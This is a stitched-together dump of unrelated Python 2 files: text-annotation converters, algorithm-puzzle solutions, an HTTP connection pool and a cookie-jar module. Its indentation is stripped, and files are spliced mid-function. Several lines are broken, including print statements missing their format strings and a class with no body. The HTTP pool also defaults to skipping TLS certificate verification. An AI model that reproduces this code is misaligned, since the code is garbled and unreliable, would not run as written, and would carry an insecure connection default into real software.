outfnbase = os.path.basename(infn)+'-doc-'+str(docnum)
else:
outfnbase = os.path.basename(infn)
outfn = os.path.join(output_directory, outfnbase)
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)
offset, idnum, ridnum = 0, 1, 1
doctext = ""
for si, sentence in enumerate(sentences):
tokens, deps = sentence
idmap = {}
prev_form = None
if OUTPUT_ROOT:
tokens = [('0', ROOT_STR, ROOT_STR)] + tokens
for ID, form, POS in tokens:
if prev_form is not None:
doctext = doctext + ' '
offset += 1
print >> soout, tokstr(offset, offset+len(form), POS, idnum, form)
assert ID not in idmap, "Error in data: dup ID"
idmap[ID] = idnum
idnum += 1
doctext = doctext + form
offset += len(form)
prev_form = form
for dep, head, rel in deps:
if not OUTPUT_ROOT and head == '0':
continue
print >> soout, depstr(idmap[dep], idmap[head], rel, ridnum)
ridnum += 1
if si+1 != len(sentences):
doctext = doctext + '\n'
offset += 1
print >> txtout, doctext
def process(fn):
docnum = 1
sentences = []
with codecs.open(fn, encoding=INPUT_ENCODING) as f:
tokens, deps = [], []
lines = f.readlines()
for ln, l in enumerate(lines):
l = l.strip()
if len(l) > 0 and l[0] == "#":
continue
if re.match(r'^\s*$', l):
if len(tokens) > 0:
sentences.append((tokens, deps))
tokens, deps = [], []
if MAX_DOC_SENTENCES and len(sentences) >= MAX_DOC_SENTENCES:
output(fn, docnum, sentences)
sentences = []
docnum += 1
continue
fields = l.split('\t')
assert len(fields) == 10, "Format error on line %d in %s: expected 10 fields, got %d: %s" % (ln, fn, len(fields), l)
ID, form, POS = fields[0], fields[1], fields[4]
head, rel = fields[6], fields[7]
tokens.append((ID, form, POS))
if head != "_":
deps.append((ID, head, rel))
if len(tokens) > 0:
sentences.append((tokens, deps))
if len(sentences) > 0:
output(fn, docnum, sentences)
def main(argv):
global output_directory
output_directory = None
filenames = argv[1:]
if len(argv) > 2 and argv[1] == "-o":
output_directory = argv[2]
print >> sys.stderr, "Writing output to %s" % output_directory
filenames = argv[3:]
fail_count = 0
for fn in filenames:
try:
process(fn)
except Exception, e:
m = unicode(e).encode(OUTPUT_ENCODING)
print >> sys.stderr, "Error processing %s: %s" % (fn, m)
fail_count += 1
if fail_count > 0:
print >> sys.stderr,  % (fail_count, len(filenames))
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
class Solution(object):
def __init__(self):
self.max = -1
self.cur_area = 0
self.dirs = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]
def solve(self, cipher):
m, n, mat = cipher
visited = [[False for _ in xrange(n)] for _ in xrange(m)]
for i in xrange(m):
for j in xrange(n):
if not visited[i][j] and mat[i][j] == 1:
self.cur_area = 0
self.dfs(visited, mat, i, j, m, n)
return self.max
def dfs(self, visited, mat, i, j, m, n):
visited[i][j] = True
self.cur_area += 1
self.max = max(self.max, self.cur_area)
for dir in self.dirs:
i1 = i + dir[0]
j1 = j + dir[1]
if 0 <= i1 < m and 0 <= j1 < n and not visited[i1][j1] and mat[i1][j1] == 1:
self.dfs(visited, mat, i1, j1, m, n)
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
m = int(f.readline().strip())
n = int(f.readline().strip())
mat = []
for i in xrange(m):
mat.append(map(int, f.readline().strip().split(' ')))
cipher = m, n, mat
s = "%s\n" % (solution.solve(cipher))
print s,
MOD = 1234567
class Solution(object):
def solve(self, cipher):
return reduce(lambda x, y: x * y % MOD, cipher)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
N = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
import logging
import socket
import errno
from socket import error as SocketError, timeout as SocketTimeout
try:
from http.client import HTTPConnection, HTTPException
from http.client import HTTP_PORT, HTTPS_PORT
except ImportError:
from httplib import HTTPConnection, HTTPException
from httplib import HTTP_PORT, HTTPS_PORT
try:
from queue import LifoQueue, Empty, Full
except ImportError:
from Queue import LifoQueue, Empty, Full
try:
HTTPSConnection = object
BaseSSLError = None
ssl = None
try:
from http.client import HTTPSConnection
except ImportError:
from httplib import HTTPSConnection
import ssl
BaseSSLError = ssl.SSLError
except (ImportError, AttributeError):
pass
from .request import RequestMethods
from .response import HTTPResponse
from .util import get_host, is_connection_dropped, ssl_wrap_socket
from .exceptions import (
ClosedPoolError,
EmptyPoolError,
HostChangedError,
MaxRetryError,
SSLError,
TimeoutError,
)
from .packages.ssl_match_hostname import match_hostname, CertificateError
from .packages import six
xrange = six.moves.xrange
log = logging.getLogger(__name__)
_Default = object()
port_by_scheme = {
'http': HTTP_PORT,
'https': HTTPS_PORT,
}
class VerifiedHTTPSConnection(HTTPSConnection):
cert_reqs = None
ca_certs = None
ssl_version = None
def set_cert(self, key_file=None, cert_file=None,
cert_reqs='CERT_NONE', ca_certs=None):
ssl_req_scheme = {
'CERT_NONE': ssl.CERT_NONE,
'CERT_OPTIONAL': ssl.CERT_OPTIONAL,
'CERT_REQUIRED': ssl.CERT_REQUIRED
}
self.key_file = key_file
self.cert_file = cert_file
self.cert_reqs = ssl_req_scheme.get(cert_reqs) or ssl.CERT_NONE
self.ca_certs = ca_certs
def connect(self):
sock = socket.create_connection((self.host, self.port), self.timeout)
self.sock = ssl_wrap_socket(sock, self.key_file, self.cert_file,
cert_reqs=self.cert_reqs,
ca_certs=self.ca_certs,
server_hostname=self.host,
ssl_version=self.ssl_version)
if self.ca_certs:
match_hostname(self.sock.getpeercert(), self.host)
class ConnectionPool(object):
scheme = None
QueueCls = LifoQueue
def __init__(self, host, port=None):
self.host = host
self.port = port
def __str__(self):
return '%s(host=%r, port=%r)' % (type(self).__name__,
self.host, self.port)
class HTTPConnectionPool(ConnectionPool, RequestMethods):
scheme = 'http'
def __init__(self, host, port=None, strict=False, timeout=None, maxsize=1,
block=False, headers=None):
ConnectionPool.__init__(self, host, port)
RequestMethods.__init__(self, headers)
self.strict = strict
self.timeout = timeout
self.pool = self.QueueCls(maxsize)
self.block = block
for _ in xrange(maxsize):
self.pool.put(None)
self.num_connections = 0
self.num_requests = 0
def _new_conn(self):
self.num_connections += 1
log.info("Starting new HTTP connection (%d): %s" %
(self.num_connections, self.host))
return HTTPConnection(host=self.host,
port=self.port,
strict=self.strict)
def _get_conn(self, timeout=None):
conn = None
try:
conn = self.pool.get(block=self.block, timeout=timeout)
except AttributeError:
raise ClosedPoolError(self, "Pool is closed.")
except Empty:
if self.block:
raise EmptyPoolError(self,
"Pool reached maximum size and no more "
"connections are allowed.")
pass
if conn and is_connection_dropped(conn):
log.info("Resetting dropped connection: %s" % self.host)
conn.close()
return conn or self._new_conn()
def _put_conn(self, conn):
try:
self.pool.put(conn, block=False)
return
except AttributeError:
pass
except Full:
log.warning("HttpConnectionPool is full, discarding connection: %s"
% self.host)
conn.close()
def _make_request(self, conn, method, url, timeout=_Default,
**httplib_request_kw):
self.num_requests += 1
if timeout is _Default:
timeout = self.timeout
conn.timeout = timeout
conn.request(method, url, **httplib_request_kw)
sock = getattr(conn, 'sock', False)
if sock:
sock.settimeout(timeout)
try:
httplib_response = conn.getresponse(buffering=True)
except TypeError:
httplib_response = conn.getresponse()
http_version = getattr(conn, '_http_vsn_str', 'HTTP/?')
log.debug("\"%s %s %s\" %s %s" % (method, url, http_version,
httplib_response.status,
httplib_response.length))
return httplib_response
def close(self):
old_pool, self.pool = self.pool, None
try:
while True:
conn = old_pool.get(block=False)
if conn:
conn.close()
except Empty:
pass
def is_same_host(self, url):
if url.startswith('/'):
return True
scheme, host, port = get_host(url)
if self.port and not port:
port = port_by_scheme.get(scheme)
return (scheme, host, port) == (self.scheme, self.host, self.port)
def urlopen(self, method, url, body=None, headers=None, retries=3,
redirect=True, assert_same_host=True, timeout=_Default,
pool_timeout=None, release_conn=None, **response_kw):
if headers is None:
headers = self.headers
if retries < 0:
raise MaxRetryError(self, url)
if timeout is _Default:
timeout = self.timeout
if release_conn is None:
release_conn = response_kw.get('preload_content', True)
if assert_same_host and not self.is_same_host(url):
host = "%s://%s" % (self.scheme, self.host)
if self.port:
host = "%s:%d" % (host, self.port)
raise HostChangedError(self, url, retries - 1)
conn = None
try:
conn = self._get_conn(timeout=pool_timeout)
httplib_response = self._make_request(conn, method, url,
timeout=timeout,
body=body, headers=headers)
response_conn = not release_conn and conn
response = HTTPResponse.from_httplib(httplib_response,
pool=self,
connection=response_conn,
**response_kw)
except Empty as e:
raise TimeoutError(self, "Request timed out. (pool_timeout=%s)" %
pool_timeout)
except SocketTimeout as e:
raise TimeoutError(self, "Request timed out. (timeout=%s)" %
timeout)
except BaseSSLError as e:
raise SSLError(e)
except CertificateError as e:
raise SSLError(e)
except (HTTPException, SocketError) as e:
conn = None
err = e
if retries == 0:
raise MaxRetryError(self, url, e)
finally:
if release_conn:
self._put_conn(conn)
if not conn:
log.warn("Retrying (%d attempts remain) after connection "
"broken by '%r': %s" % (retries, err, url))
return self.urlopen(method, url, body, headers, retries - 1,
redirect, assert_same_host,
timeout=timeout, pool_timeout=pool_timeout,
release_conn=release_conn, **response_kw)
redirect_location = redirect and response.get_redirect_location()
if redirect_location:
if response.status == 303:
method = 'GET'
log.info("Redirecting %s -> %s" % (url, redirect_location))
return self.urlopen(method, redirect_location, body, headers,
retries - 1, redirect, assert_same_host,
timeout=timeout, pool_timeout=pool_timeout,
release_conn=release_conn, **response_kw)
return response
class HTTPSConnectionPool(HTTPConnectionPool):
scheme = 'https'
def __init__(self, host, port=None,
strict=False, timeout=None, maxsize=1,
block=False, headers=None,
key_file=None, cert_file=None,
cert_reqs='CERT_NONE', ca_certs=None, ssl_version=None):
HTTPConnectionPool.__init__(self, host, port,
strict, timeout, maxsize,
block, headers)
self.key_file = key_file
self.cert_file = cert_file
self.cert_reqs = cert_reqs
self.ca_certs = ca_certs
self.ssl_version = ssl_version
def _new_conn(self):
self.num_connections += 1
log.info("Starting new HTTPS connection (%d): %s"
% (self.num_connections, self.host))
if not ssl:
if not HTTPSConnection or HTTPSConnection is object:
raise SSLError("Can't connect to HTTPS URL because the SSL "
"module is not available.")
return HTTPSConnection(host=self.host,
port=self.port,
strict=self.strict)
connection = VerifiedHTTPSConnection(host=self.host,
port=self.port,
strict=self.strict)
connection.set_cert(key_file=self.key_file, cert_file=self.cert_file,
cert_reqs=self.cert_reqs, ca_certs=self.ca_certs)
if self.ssl_version is None:
connection.ssl_version = ssl.PROTOCOL_SSLv23
else:
connection.ssl_version = self.ssl_version
return connection
def connection_from_url(url, **kw):
scheme, host, port = get_host(url)
if scheme == 'https':
return HTTPSConnectionPool(host, port=port, **kw)
else:
return HTTPConnectionPool(host, port=port, **kw)
class Solution_TLE(object):
def solve(self, cipher):
n, k, a = cipher
f = [0 for _ in xrange(n + 1)]
for i in xrange(1, n + 1):
f[i] = f[i - 1] + a[i - 1]
result = 0
for i in xrange(1, n + 1):
for j in xrange(0, i):
if (f[i] - f[j]) % k == 0:
result += 1
return result
class Solution(object):
def solve(self, cipher):
n, k, a = cipher
cnts = [0 for _ in xrange(k)]
s = 0
cnts[0] = 1
for num in a:
s += num
s %= k
cnts[s] += 1
result = 0
for cnt in cnts:
result += (cnt * (cnt - 1)) / 2
return result
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
n, k = map(int, f.readline().strip().split(' '))
a = map(int, f.readline().strip().split(' '))
cipher = n, k, a
s = "%s\n" % (solution.solve(cipher))
print s,
_debug = 0
eDetecting = 0
eFoundIt = 1
eNotMe = 2
eStart = 0
eError = 1
eItsMe = 2
SHORTCUT_THRESHOLD = 0.95
import importlib
import inspect
import sys
import os.path as op
class Importer(object):
@staticmethod
def import_module(path):
sys.path.append(op.dirname(path))
file_name = op.splitext(op.basename(path))[0]
return importlib.import_module(file_name)
@staticmethod
def inspect_module_classes(path):
module = Importer.import_module(path)
return [(name, module) for name, obj in inspect.getmembers(module)
if inspect.isclass(obj)
]
from celery import Celery
redis_url = 'redis://localhost:6379/0'
app = Celery('overridden by celery command', broker=redis_url)
@app.task
def consume(a, b):
print "consume a+b = %d" % (a + b)
return a + b
class Solution(object):
def maxArea(self, H):
maxa = 0
s = 0
e = len(H) - 1
while s < e:
maxa = max(maxa, min(H[s], H[e])*(e-s))
if H[s] < H[e]:
s += 1
else:
e -= 1
return maxa
from collections import namedtuple
Sum = namedtuple("Sum", "sum i j")
class Solution:
def continuousSubarraySumII(self, A):
if len(A) < 1:
return [-1, -1]
linear = self.linear_max_sum(A)
circular = self.circular_max_sum(A)
if linear.sum > circular.sum:
return [linear.i, linear.j]
return [circular.i, circular.j]
def circular_max_sum(self, A):
n = len(A)
left = [None for _ in A]
right = [None for _ in A]
cur, max_sum, idx = 0, A[0], 0
for i in xrange(n):
cur += A[i]
if cur > max_sum:
idx = i
max_sum = cur
left[i] = (max_sum, idx)
cur, max_sum, idx = 0, A[n-1], n-1
for i in xrange(n-1, -1, -1):
cur += A[i]
if cur > max_sum:
idx = i
max_sum = cur
right[i] = (max_sum, idx)
ret = Sum(A[0], 0, 0)
for i in xrange(1, n):
r = right[i]
l = left[i-1]
if ret.sum < r[0]+l[0]:
ret = Sum(r[0]+l[0], r[1], l[1])
return ret
def linear_max_sum(self, A):
ret = Sum(A[0], 0, 0)
cur = 0
s = 0
for e, v in enumerate(A):
cur += v
if ret.sum < cur:
ret = Sum(cur, s, e)
if cur < 0:
s = e+1
cur = 0
return ret
if __name__ == "__main__":
assert Solution().continuousSubarraySumII([3, 1, -100, -3, 4]) == [4, 1]
assert Solution().continuousSubarraySumII([-5, 10, 5, -3, 1, 1, 1, -2, 3, -4]) == [1, 8]
from collections import namedtuple
Sum = namedtuple("Sum", "sum i j")
class Solution:
def continuousSubarraySum(self, A):
if len(A) < 1:
return [-1, -1]
ret = Sum(A[0], 0, 0)
cur = 0
s = 0
for e, v in enumerate(A):
cur += v
if ret.sum < cur:
ret = Sum(cur, s, e)
if cur < 0:
s = e+1
cur = 0
return [ret.i, ret.j]
if __name__ == "__main__":
assert Solution().continuousSubarraySum(
[-101, -33, -44, -55, -67, -78, -101, -33, -44, -55, -67, -78, -100, -200, -1000, -22, -100, -200, -1000, -22]
) == [15, 15]
def fact(n):
if n == 0:
return 1
else:
return n * fact(n - 1)
id = lambda x: x
def factCPS(n):
def f(n, k):
if n == 0:
return k(1)
else:
return f(n - 1, lambda x: k(n * x))
return f(n, id)
def factNoRec(n):
def factory(n, k):
return lambda x: k(n * x)
k = id
while True:
if n == 0:
return k(1)
else:
k = factory(n, k)
n -= 1
def factHolyCrap(n):
k = ()
while True:
if n == 0:
x = 1
while k:
x = k[0] * x
k = k[1]
return id(x)
else:
k = (n, k)
n -= 1
if __name__ == '__main__':
print([f(5) for f in [fact, factCPS, factNoRec, factHolyCrap]])
BASE = 2
for i in range(2**3):
weight = []
for j in xrange(3):
weight.append(i%(BASE))
i /= BASE
weight.reverse()
print weight
class Solution:
def convertToPN(self, expression):
return self.infix2prefix(expression)
def infix2prefix(self, lst):
stk = []
pre = []
for elt in reversed(lst):
if elt.isdigit():
pre.append(elt)
elif elt == ")":
stk.append(elt)
elif elt == "(":
while stk and stk[-1] != ")":
pre.append(stk.pop())
stk.pop()
else:
while stk and self.precedence(elt) < self.precedence(stk[-1]):
pre.append(stk.pop())
stk.append(elt)
while stk:
pre.append(stk.pop())
pre.reverse()
return pre
def precedence(self, x):
if x in ("(", ")"):
return 0
if x in ("+", "-"):
return 1
if x in ("*", "/"):
return 2
return 3
if __name__ == "__main__":
assert Solution().infix2prefix(["(", "5", "-", "6", ")", "*", "7"]) == ['*', '-', '5', '6', '7']
class Solution(object):
def convertToRPN(self, expression):
return self.infix2postfix(expression)
def infix2postfix(self, lst):
stk = []
ret = []
for elt in lst:
if elt.isdigit():
ret.append(elt)
elif elt == "(":
stk.append(elt)
elif elt == ")":
while stk and stk[-1] != "(":
ret.append(stk.pop())
stk.pop()
else:
while stk and self.precedence(elt) <= self.precedence(stk[-1]):
ret.append(stk.pop())
stk.append(elt)
while stk:
ret.append(stk.pop())
return ret
def precedence(self, x):
if x in ("(", ")"):
return 0
if x in ("+", "-"):
return 1
if x in ("*", "/"):
return 2
return 3
if __name__ == "__main__":
print Solution().infix2postfix(["3", "-", "4", "+", "5"])
class Solution:
def bitSwapRequired(self, a, b):
a = self.to_bin(a)
b = self.to_bin(b)
diff = len(a)-len(b)
ret = 0
if diff<0:
a, b = b, a
diff *= -1
b = "0"*diff+b
for i in xrange(len(b)):
if a[i]!=b[i]:
ret += 1
return ret
def to_bin(self, n):
a = abs(n)
lst = []
while a>0:
lst.append(a%2)
a /= 2
if n>=0:
lst.extend([0]*(32-len(lst)))
else:
pivot = -1
for i in xrange(len(lst)):
if pivot==-1 and lst[i]==1:
pivot = i
continue
if pivot!=-1:
lst[i] ^= 1
lst.extend([1]*(32-len(lst)))
return "".join(map(str, reversed(lst)))
if __name__=="__main__":
assert Solution().bitSwapRequired(1, -1)==31
assert Solution().bitSwapRequired(31, 14)==2
from __future__ import with_statement
import sys
import re
import codecs
INPUT_ENCODING = "UTF-8"
TAX_ID_LABEL = 'Organism'
GENE_ID_LABEL = 'Gene ID'
SYMBOL_LABEL = 'Symbol'
LOCUS_LABEL = 'Locus'
SYNONYM_LABEL = 'Also known as'
CHROMOSOME_LABEL = 'Chromosome'
DESCRIPTION_LABEL = 'Description'
GENE_TYPE_LABEL = 'Gene type'
SYMBOL_AUTHORITY_LABEL = 'Official symbol'
FULL_NAME_AUTHORITY_LABEL = 'Official full name'
OTHER_DESIGNATION_LABEL = 'Name'
OUTPUT_LABEL_ORDER = [
SYMBOL_AUTHORITY_LABEL,
SYMBOL_LABEL,
FULL_NAME_AUTHORITY_LABEL,
GENE_TYPE_LABEL,
TAX_ID_LABEL,
SYNONYM_LABEL,
OTHER_DESIGNATION_LABEL,
LOCUS_LABEL,
CHROMOSOME_LABEL,
DESCRIPTION_LABEL,
]
FILTER_LIST = [
]
def process_tax_id(val, record):
assert re.match(r'^[0-9]+$', val)
record.append(('info', TAX_ID_LABEL, val))
def process_gene_id(val, record):
assert re.match(r'^[0-9]+$', val)
record.append(('key', GENE_ID_LABEL, val))
def process_symbol(val, record):
assert val != '-'
for v in val.split('|'):
assert re.match(r'^\S(?:.*\S)?$', v)
record.append(('name', SYMBOL_LABEL, v))
def process_locus(val, record):
if val != '-':
assert re.match(r'^[^\s|]+$', val)
record.append(('name', LOCUS_LABEL, val))
def process_synonyms(val, record):
if val != '-':
for v in val.split('|'):
assert re.match(r'^\S(?:.*\S)?$', v)
record.append(('name', SYNONYM_LABEL, v))
def process_chromosome(val, record):
if val != '-':
assert re.match(r'^\S(?:.*\S)?$', val)
record.append(('info', CHROMOSOME_LABEL, val))
def process_description(val, record):
if val != '-':
record.append(('info', DESCRIPTION_LABEL, val))
def process_gene_type(val, record):
if val != '-':
record.append(('info', GENE_TYPE_LABEL, val))
def process_symbol_authority(val, record):
if val != '-':
record.append(('name', SYMBOL_AUTHORITY_LABEL, val))
def process_full_name_authority(val, record):
if val != '-':
record.append(('name', FULL_NAME_AUTHORITY_LABEL, val))
def process_other_designations(val, record):
if val != '-':
for v in val.split('|'):
assert re.match(r'^\S(?:.*\S)?$', v)
record.append(('name', OTHER_DESIGNATION_LABEL, v))
field_processor = [
process_tax_id,
process_gene_id,
process_symbol,
process_locus,
process_synonyms,
None,
process_chromosome,
None,
process_description,
process_gene_type,
process_symbol_authority,
process_full_name_authority,
None,
process_other_designations,
None,
]
output_priority = {}
for i, l in enumerate(OUTPUT_LABEL_ORDER):
output_priority[l] = output_priority.get(l, i)
filter = set(FILTER_LIST)
def process_line(l):
fields = l.split('\t')
assert len(fields) == 15
record = []
for i, f in enumerate(fields):
if field_processor[i] is not None:
try:
field_processor[i](f, record)
except:
print >> sys.stderr, "Error processing field %d: '%s'" % (i+1,f)
raise
keys = [r for r in record if r[0] == 'key']
assert len(keys) == 1
key = keys[0]
record = [r for r in record if r[0] != 'key']
record.sort(lambda a, b: cmp(output_priority[a[1]],
output_priority[b[1]]))
filtered = []
for r in record:
if r not in filter:
filtered.append(r)
record = filtered
seen = set()
uniqued = []
for r in record:
if (r[0],r[2]) not in seen:
seen.add((r[0],r[2]))
uniqued.append(r)
record = uniqued
print '\t'.join([key[2]]+[':'.join(r) for r in record])
def process(fn):
with codecs.open(fn, encoding=INPUT_ENCODING) as f:
for ln, l in enumerate(f):
l = l.rstrip('\r\n')
if l and l[0] == '#':
continue
try:
process_line(l)
except Exception, e:
print >> sys.stderr, "Error processing line %d: %s" % (ln, l)
raise
def main(argv):
if len(argv) < 2:
print >> sys.stderr, "Usage:", argv[0], "GENE-INFO-FILE"
return 1
fn = argv[1]
process(fn)
if __name__ == "__main__":
sys.exit(main(sys.argv))
from __future__ import with_statement
import sys
import os
import re
import codecs
INPUT_ENCODING = "UTF-8"
OUTPUT_ENCODING = "UTF-8"
ENTITY_TYPE = "Disease"
ATTR_TYPE = "Category"
FILE_PREFIX = "PMID-"
output_directory = None
def output(docid, text, anns):
global output_directory
if output_directory is None:
txtout = sys.stdout
soout = sys.stdout
else:
outfn = os.path.join(output_directory, FILE_PREFIX+docid)
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)
txtout.write(text)
idseq = 1
for start, end, type_, text in anns:
print >> soout, "T%d\t%s %d %d\t%s" % (idseq, ENTITY_TYPE, start, end,
text)
print >> soout, "A%d\t%s T%d %s" % (idseq, ATTR_TYPE, idseq, type_)
idseq += 1
if output_directory is not None:
txtout.close()
soout.close()
def parse(s):
text, anns = "", []
s = re.sub(r'(<category[^<>]*>)( +)', r'\2\1', s)
s = re.sub(r'( +)(<\/category>)', r'\2\1', s)
rest = s.strip()
while True:
m = re.match(r'^(.*?)<category="([^"]+)">(.*?)</category>(.*)$', rest)
if not m:
break
pre, type_, tagged, rest = m.groups()
text += pre
anns.append((len(text), len(text)+len(tagged), type_, tagged))
text += tagged
text += rest
return text, anns
def process(fn):
docnum = 1
sentences = []
with codecs.open(fn, encoding=INPUT_ENCODING) as f:
for l in f:
l = l.strip('\n\r')
try:
PMID, title, body = l.split('\t', 2)
except ValueError:
assert False, "Expected three TAB-separated fields, got '%s'" %l
body = body.replace('\t', ' ')
t_text, t_anns = parse(title)
b_text, b_anns = parse(body)
t_text += '\n'
b_text += '\n'
text = t_text + b_text
anns = t_anns + [(a[0]+len(t_text),a[1]+len(t_text),a[2],a[3])
for a in b_anns]
output(PMID, text, anns)
def main(argv):
global output_directory
output_directory = None
filenames = argv[1:]
if len(argv) > 2 and argv[1] == "-o":
output_directory = argv[2]
print >> sys.stderr, "Writing output to %s" % output_directory
filenames = argv[3:]
fail_count = 0
for fn in filenames:
try:
process(fn)
except Exception, e:
print >> sys.stderr, "Error processing %s: %s" % (fn, e)
fail_count += 1
if fail_count > 0:
print >> sys.stderr,  % (fail_count, len(filenames))
if __name__ == "__main__":
sys.exit(main(sys.argv))
from __future__ import with_statement
import sys
import re
import codecs
INPUT_ENCODING = "UTF-8"
DISCARD_NAME_CLASS = [
"misspelling",
"misnomer",
"type material",
"includes",
"in-part",
"authority",
"teleomorph",
"genbank anamorph",
"anamorph",
"blast name",
]
NAME_CLASS_MAP = {
"genbank common name" : "common name",
"genbank synonym" : "synonym",
"equivalent name" : "synonym",
"acronym" : "synonym",
"genbank acronym" : "synonym",
"genbank anamorph" : "anamorph",
}
NAME_ORDER_BY_CLASS = [
"scientific name",
"common name",
"synonym",
] + DISCARD_NAME_CLASS
def main(argv):
if len(argv) < 2:
print >> sys.stderr, "Usage:", argv[0], "names.dmp"
return 1
namesfn = argv[1]
names_by_tax_id = {}
with codecs.open(namesfn, encoding=INPUT_ENCODING) as f:
for i, l in enumerate(f):
l = l.strip('\n\r')
fields = l.split('|')
assert len(fields) >= 4, "Format error on line %d: %s" % (i+1, l)
fields = [t.strip() for t in fields]
tax_id, name_txt, name_class = fields[0], fields[1], fields[3]
if tax_id not in names_by_tax_id:
names_by_tax_id[tax_id] = []
names_by_tax_id[tax_id].append((name_txt, name_class))
for tax_id in names_by_tax_id:
for dnc in DISCARD_NAME_CLASS:
filtered = [(t, c) for t, c in names_by_tax_id[tax_id] if c != dnc]
if filtered:
names_by_tax_id[tax_id] = filtered
else:
print "emptied", tax_id, names_by_tax_id[tax_id]
for tax_id in names_by_tax_id:
mapped = []
for t, c in names_by_tax_id[tax_id]:
mapped.append((t, NAME_CLASS_MAP.get(c,c)))
names_by_tax_id[tax_id] = mapped
nc_rank = dict((b,a) for a,b in enumerate(NAME_ORDER_BY_CLASS))
for tax_id in names_by_tax_id:
names_by_tax_id[tax_id].sort(lambda a, b: cmp(nc_rank[a[1]],
nc_rank[b[1]]))
for tax_id in sorted(names_by_tax_id, lambda a, b: cmp(int(a),int(b))):
sys.stdout.write(tax_id)
for t, c in names_by_tax_id[tax_id]:
c = c[0].upper()+c[1:]
sys.stdout.write("\tname:%s:%s" % (c, t))
sys.stdout.write("\n")
if __name__ == "__main__":
sys.exit(main(sys.argv))
import collections
from .compat import cookielib, urlparse, Morsel
try:
import threading
threading
except ImportError:
import dummy_threading as threading
class MockRequest(object):
def __init__(self, request):
self._r = request
self._new_headers = {}
self.type = urlparse(self._r.url).scheme
def get_type(self):
return self.type
def get_host(self):
return urlparse(self._r.url).netloc
def get_origin_req_host(self):
return self.get_host()
def get_full_url(self):
return self._r.url
def is_unverifiable(self):
return True
def has_header(self, name):
return name in self._r.headers or name in self._new_headers
def get_header(self, name, default=None):
return self._r.headers.get(name, self._new_headers.get(name, default))
def add_header(self, key, val):
raise NotImplementedError("Cookie headers should be added with add_unredirected_header()")
def add_unredirected_header(self, name, value):
self._new_headers[name] = value
def get_new_headers(self):
return self._new_headers
@property
def unverifiable(self):
return self.is_unverifiable()
class MockResponse(object):
def __init__(self, headers):
self._headers = headers
def info(self):
return self._headers
def getheaders(self, name):
self._headers.getheaders(name)
def extract_cookies_to_jar(jar, request, response):
req = MockRequest(request)
res = MockResponse(response._original_response.msg)
jar.extract_cookies(res, req)
def get_cookie_header(jar, request):
r = MockRequest(request)
jar.add_cookie_header(r)
return r.get_new_headers().get('Cookie')
def remove_cookie_by_name(cookiejar, name, domain=None, path=None):
clearables = []
for cookie in cookiejar:
if cookie.name == name:
if domain is None or domain == cookie.domain:
if path is None or path == cookie.path:
clearables.append((cookie.domain, cookie.path, cookie.name))
for domain, path, name in clearables:
cookiejar.clear(domain, path, name)
class CookieConflictError(RuntimeError):
class RequestsCookieJar(cookielib.CookieJar, collections.MutableMapping):
def get(self, name, default=None, domain=None, path=None):
try:
return self._find_no_duplicates(name, domain, path)
except KeyError:
return default
def set(self, name, value, **kwargs):
if value is None:
remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))
return
if isinstance(value, Morsel):
c = morsel_to_cookie(value)
else:
c = create_cookie(name, value, **kwargs)
self.set_cookie(c)
return c
def keys(self):
keys = []
for cookie in iter(self):
keys.append(cookie.name)
return keys
def values(self):
values = []
for cookie in iter(self):
values.append(cookie.value)
return values
def items(self):
items = []
for cookie in iter(self):
items.append((cookie.name, cookie.value))
return items
def list_domains(self):
domains = []
for cookie in iter(self):
if cookie.domain not in domains:
domains.append(cookie.domain)
return domains
def list_paths(self):
paths = []
for cookie in iter(self):
if cookie.path not in paths:
paths.append(cookie.path)
return paths
def multiple_domains(self):
domains = []
for cookie in iter(self):
if cookie.domain is not None and cookie.domain in domains:
return True
domains.append(cookie.domain)
return False
def get_dict(self, domain=None, path=None):
dictionary = {}
for cookie in iter(self):
if (domain is None or cookie.domain == domain) and (path is None
or cookie.path == path):
dictionary[cookie.name] = cookie.value
return dictionary
def __getitem__(self, name):
return self._find_no_duplicates(name)
def __setitem__(self, name, value):
self.set(name, value)
def __delitem__(self, name):
remove_cookie_by_name(self, name)
def _find(self, name, domain=None, path=None):
for cookie in iter(self):
if cookie.name == name:
if domain is None or cookie.domain == domain:
if path is None or cookie.path == path:
return cookie.value
raise KeyError('name=%r, domain=%r, path=%r' % (name, domain, path))
def _find_no_duplicates(self, name, domain=None, path=None):
toReturn = None
for cookie in iter(self):
if cookie.name == name:
if domain is None or cookie.domain == domain:
if path is None or cookie.path == path:
if toReturn is not None:
raise CookieConflictError('There are multiple cookies with name, %r' % (name))
toReturn = cookie.value
if toReturn:
return toReturn
raise KeyError('name=%r, domain=%r, path=%r' % (name, domain, path))
def __getstate__(self):
state = self.__dict__.copy()
state.pop('_cookies_lock')
return state
def __setstate__(self, state):
self.__dict__.update(state)
if '_cookies_lock' not in self.__dict__:
self._cookies_lock = threading.RLock()
def copy(self):
raise NotImplementedError
def create_cookie(name, value, **kwargs):
result = dict(
version=0,
name=name,
value=value,
port=None,
domain='',
path='/',
secure=False,
expires=None,
discard=True,
comment=None,
comment_url=None,
rest={'HttpOnly': None},
rfc2109=False,)
badargs = set(kwargs) - set(result)
if badargs:
err = 'create_cookie() got unexpected keyword arguments: %s'
raise TypeError(err % list(badargs))
result.update(kwargs)
result['port_specified'] = bool(result['port'])
result['domain_specified'] = bool(result['domain'])
result['domain_initial_dot'] = result['domain'].startswith('.')
result['path_specified'] = bool(result['path'])
return cookielib.Cookie(**result)
def morsel_to_cookie(morsel):
c = create_cookie(
name=morsel.key,
value=morsel.value,
version=morsel['version'] or 0,
port=None,
port_specified=False,
domain=morsel['domain'],
domain_specified=bool(morsel['domain']),
domain_initial_dot=morsel['domain'].startswith('.'),
path=morsel['path'],
